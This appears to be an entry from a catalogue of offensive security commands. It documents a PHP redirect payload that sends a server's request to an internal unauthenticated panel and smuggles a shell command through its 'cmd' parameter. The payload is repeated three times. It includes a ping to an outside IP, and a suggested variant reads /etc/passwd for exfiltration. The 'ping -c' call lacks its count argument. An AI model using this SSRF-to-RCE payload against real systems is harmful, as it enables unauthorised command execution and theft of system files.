---
id: cmd-php-internal-rce
data: >-
  <?php header('Location: http://127.0.0.1:1234/mypanel.php?cmd=ping -c
  192.166.218.53'); ?>
tags:
  - ssrf
  - rce
  - internal
type: command
output: null
executor: php
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:53:38.067Z'
verified: false
validated: true
submitted: true
---
# php-redirect-to-internal-rce

## Command

```php
<?php header('Location: http://127.0.0.1:1234/mypanel.php?cmd=ping -c 192.166.218.53'); ?>
```

## Description

Hypothetical redirect to an internal unauthenticated panel with command injection, enabling RCE via SSRF.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| Location | Internal HTTP URL with cmd param | Yes |

## Examples

### Basic Usage

```php
<?php header('Location: http://127.0.0.1:1234/mypanel.php?cmd=ping -c 192.166.218.53'); ?>
```

### Advanced Usage

Vary cmd: ?cmd=cat /etc/passwd for data exfil.

## Expected Output

302 leading to command execution; e.g., ping response to attacker.

## Related

- [[commands/php-redirect-to-dict-memcached]]
- [[procedures/Insert-SSRF-Payload-in-Message]]
